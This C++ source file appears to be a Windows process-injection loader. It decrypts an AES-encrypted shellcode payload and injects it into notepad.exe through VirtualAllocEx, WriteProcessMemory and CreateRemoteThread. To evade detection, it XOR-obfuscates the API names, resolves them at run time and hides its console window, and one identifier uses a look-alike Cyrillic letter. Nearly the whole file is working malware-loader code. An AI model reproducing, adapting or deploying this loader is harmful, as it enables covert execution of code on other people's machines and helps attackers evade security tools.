#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include "Encryption.h"

char AESkey[] = { 0x40, 0xd7, 0xa5, 0xbc, 0x7c, 0x69, 0x9e, 0x25, 0x31, 0x0d, 0xd1, 0x32, 0xde, 0x9d, 0xad, 0xd9 };
std::vector<BYTE> payload = { 0xc9, 0x27, 0xc0, 0xdd, 0xb1, 0x75, 0xac, 0x27, 0xd9, 0x75, 0x13, 0x63, 0x95, 0x71, 0x62, 0x2b, 0xa0, 0x56, 0xf6, 0x9b, 0x65, 0x6c, 0x39, 0xf8, 0xbb, 0x19, 0x5b, 0xf6, 0x51, 0xe2, 0xa3, 0x96, 0x10, 0xa9, 0x35, 0xf6, 0xd9, 0x26, 0xa9, 0x7a, 0x96, 0x7d, 0xfc, 0xa8, 0xf7, 0x3b, 0x65, 0x34, 0xf7, 0xf9, 0x25, 0x4f, 0x62, 0xfa, 0x6e, 0x95, 0xb3, 0x74, 0x12, 0x8b, 0x6b, 0x8a, 0x32, 0xbd, 0xd0, 0xb0, 0x2b, 0x76, 0x72, 0x11, 0x3a, 0x34, 0x89, 0x84, 0x73, 0xe1, 0x4e, 0xe4, 0x94, 0x39, 0x8a, 0xed, 0xb2, 0xf4, 0x36, 0x4d, 0x2b, 0x38, 0x9e, 0xf0, 0xa0, 0xed, 0xda, 0x19, 0x86, 0x3e, 0x11, 0x31, 0xfd, 0x24, 0x3a, 0xa3, 0xc5, 0x0e, 0x59, 0xc6, 0xf2, 0x8f, 0xb7, 0xa8, 0x24, 0x9c, 0x56, 0xa5, 0x51, 0x05, 0xf4, 0x92, 0xcb, 0xda, 0x3a, 0xb3, 0xb7, 0x99, 0x5b, 0x72, 0xe1, 0x89, 0x1c, 0x12, 0x9e, 0xf8, 0xfc, 0x78, 0xc3, 0x01, 0xb5, 0x64, 0x47, 0x34, 0x13, 0x4f, 0xfe, 0x4a, 0xe8, 0xbe, 0x77, 0xdc, 0x9b, 0xd3, 0xa8, 0x21, 0x5a, 0x25, 0x2a, 0xe6, 0xc2, 0x6f, 0x13, 0x08, 0xcd, 0xef, 0x08, 0x8b, 0x29, 0xc0, 0x92, 0x9e, 0xce, 0x99, 0x38, 0xc3, 0xf3, 0xe8, 0x24, 0x4d, 0xe6, 0xd1, 0xb7, 0xe6, 0x0e, 0x3b, 0xd3, 0x47, 0x51, 0xae, 0x2f, 0x5b, 0xc1, 0xec, 0xd2, 0x41, 0x1a, 0x14, 0xc6, 0x19, 0x88, 0x35, 0x20, 0x8d, 0x51, 0xaa, 0x89, 0x91, 0x02, 0xa5, 0xb5, 0x81, 0x9b, 0x09, 0x6b, 0xb2, 0x3c, 0x53, 0x95, 0x07, 0x14, 0xeb, 0x26, 0xad, 0xb7, 0x30, 0x00, 0x69, 0xa3, 0x59, 0xa1, 0xbd, 0xd8, 0xd2, 0xb0, 0x0a, 0x22, 0x1c, 0xfc, 0xdc, 0x33, 0x69, 0xc2, 0x9e, 0x5b, 0x3d, 0xb9, 0xb8, 0x5f, 0xfa, 0x20, 0xe3, 0x64, 0x83, 0x5b, 0x4d, 0x52, 0x23, 0xdd, 0x5f, 0x6c, 0x04, 0xa0, 0x61, 0x07, 0x10, 0x0d, 0x8e, 0xe8, 0xaa, 0xcf, 0xec, 0xc9, 0x36, 0x7f, 0x72, 0x91, 0x4e, 0xc4, 0x9b, 0xb1, 0xf5, 0x0b, 0x8d, 0x73, 0xf2, 0xdd, 0xf0, 0xfa, 0xe8, 0xff, 0x88, 0x49, 0x4f, 0xed, 0x9d, 0x07, 0xb7, 0x4d, 0xba, 0x49, 0xfc, 0xe9, 0xeb, 0xaf, 0xe3, 0xab, 0xff, 0x7a, 0x34, 0x41, 0xf9, 0x8d, 0xcd, 0x0a, 0xbc, 0xcb, 0xef, 0xf9, 0x2e, 0xbb, 0xe8, 0xc9, 0x03, 0x96, 0x33, 0x3c, 0x62, 0x06, 0xfe, 0x2e, 0xfc, 0x06, 0xbb, 0x79, 0x2e, 0x46, 0xa0, 0x1b, 0xc3 };

typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef HANDLE(WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE(WINAPI* pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI* pVirtualProtectEx)(HANDLE ,LPVOID ,SIZE_T ,DWORD  ,PDWORD );

std::string eVirtualAllocEx = { 0x37, 0xb, 0x11, 0x10, 0x10, 0x7, 0xb, 0x29, 0x5, 0x6, 0x4, 0xf, 0x28, 0x16 };
std::string eWriteProcessMemory = { 0x36, 0x10, 0xa, 0x10, 0x0, 0x36, 0x15, 0x7, 0xa, 0xf, 0x18, 0x1f, 0x20, 0xb, 0x2, 0x1f, 0x3, 0xb };
std::string eCreateRemoteThread = { 0x22, 0x10, 0x6, 0x5, 0x11, 0x3, 0x35, 0xd, 0x4, 0x5, 0x1f, 0x9, 0x39, 0x6, 0x1d, 0x15, 0x10, 0x16 };
std::string eVirtualProtectEx = { 0x37, 0xb, 0x11, 0x10, 0x10, 0x7, 0xb, 0x38, 0x1b, 0x5, 0x1f, 0x9, 0xe, 0x1a, 0x2a, 0x8 };
std::string eOpenProcess = { 0x2e, 0x12, 0x6, 0xa, 0x35, 0x14, 0x8, 0xb, 0xc, 0x19, 0x18 };

std::string XORkey = "abcdefghijklmnopqrstuvwxyz";

DWORD FindProcess(const wchar_t* procname) {

    HANDLE hProcSnap;
    PROCESSENTRY32W pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hProcSnap, (LPPROCESSENTRY32W)&pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32NextW(hProcSnap, &pe32)) {
        if (_wcsicmp(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);
    return pid;

}

int Inject(HANDLE hProc, std::vector<BYTE>& payload, unsigned int payload_len) {

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;
    DWORD oldprotect = 0;

    XOR(eVirtualAllocEx, XORkey);

    pVirtualAllocEx virtualAllocEx = (pVirtualAllocEx)GetProcAddress(GetModuleHandleA("Kernel32.dll"), eVirtualAllocEx.c_str());

    pRemoteCode = virtualAllocEx(hProc, NULL, payload_len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
    if (!pRemoteCode) {
        std::cout << "[!] Cannot allocating memory..." << std::endl;
        return -1;
    }
    
    XOR(eWriteProcessMemory, XORkey);

    AESDecrypt(payload, (char*)AESkey, sizeof(AESkey));
    
    pWriteProcessMemory writeProcessMemory = (pWriteProcessMemory)GetProcAddress(GetModuleHandleA("Kernel32.dll"), eWriteProcessMemory.c_str());
    writeProcessMemory(hProc, pRemoteCode, payload.data() , payload.size(), nullptr);

    XOR(eVirtualProtectEx, XORkey);

    pVirtualProtectEx virtualProtectEx = (pVirtualProtectEx)GetProcAddress(GetModuleHandleA("Kernel32.dll"), eVirtualProtectEx.c_str());
    virtualProtectEx(hProc, pRemoteCode, payload_len, PAGE_EXECUTE_READ, &oldprotect);

    XOR(eCreateRemoteThread, XORkey);

    pCreateRemoteThread сreateRemoteThread = (pCreateRemoteThread)GetProcAddress(GetModuleHandleA("Kernel32.dll"), eCreateRemoteThread.c_str());
    hThread = сreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (!hThread) {
        std::cout << "[-] Cannot create remote thread... " << std::endl;
        return -1;
    }

    std::cout << "[+] Running payload " << std::endl;

    WaitForSingleObject(hThread, -1);
    CloseHandle(hThread);

    return 0;
}


int main()
{

    FreeConsole();

    DWORD pId = 0;
    HANDLE hProc = NULL;
    
    pId = FindProcess(L"notepad.exe");
    if (!pId) {
        std::cout << "[!] Procces not found..." << std::endl;
        return -1;
    }

    XOR(eOpenProcess, XORkey);

    pOpenProcess openProcess = (pOpenProcess)GetProcAddress(GetModuleHandleA("Kernel32.dll"), eOpenProcess.c_str());
    hProc = openProcess(PROCESS_ALL_ACCESS, FALSE, pId);
    if (!hProc) {
        std::cout << "[!] Cannot open process..." << std::endl;
        return -1;
    }

    std::cout << "[+] Injection to process..." << std::endl;


    Inject(hProc, payload, payload.size());
    CloseHandle(hProc);

    return 0;

}
